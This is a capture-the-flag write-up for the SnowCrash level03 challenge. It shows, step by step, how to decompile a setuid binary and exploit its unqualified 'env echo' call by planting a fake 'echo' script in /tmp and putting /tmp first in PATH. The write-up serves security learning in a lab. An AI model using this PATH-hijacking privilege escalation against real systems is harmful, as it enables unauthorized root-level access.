## 1. Connect to level03:

```bash
level02@SnowCrash:~$ su level03
password: *use previously found flag*
```

## 2. See existing files:

```bash
level03@SnowCrash:~$ ls -l
    total 12
    -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

## 3. Locally download the file (on local computer terminal, not VM):

```bash
level03@SnowCrash:~$ scp -P 4242 level03@<your VM's IP address>:/home/user/level03/level03 ~
```

## 4. Use *`Ghidra`* application to convert file into readable code
Once open, look to the left, *Symbol Tree* > *Functions* > *main*
Look at the main and find the line

```bash
iVar1 = system("/usr/bin/env echo Exploit me");
```

## 5. Write and execute bash script that will transform the `echo` command into `getflag` command (in the VM)

```bash
# Create script file in /tmp because it is the only directory in which we have creation/edition/deletion rights
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:~$ touch echo echo.sh

# Write the cript into echo.sh:
level03@SnowCrash:~$ echo '#!/bin/bash' > /tmp/echo
level03@SnowCrash:~$ echo 'getflag' >> /tmp/echo

# Give yourself the rights
level03@SnowCrash:~$ chmod +x /tmp/echo

# Add `/tmp` at the beginning of PATH
level03@SnowCrash:~$ export PATH="/tmp:$PATH"

# Execute `level03` binary file
level03@SnowCrash:~$ ./../home/user/level03/level03

# Make the script executable
level03@SnowCrash:~$ chmod +x echo.sh

# Launch the script
level03@SnowCrash:~$ ./echo.sh
```

The program uses the `env` command, which searches for the `echo` command in the `PATH` variable. By placing your directory (`/tmp`) at the beginning of `PATH`, your version of `echo` is found first. As a result, the program executes your script instead of the system command.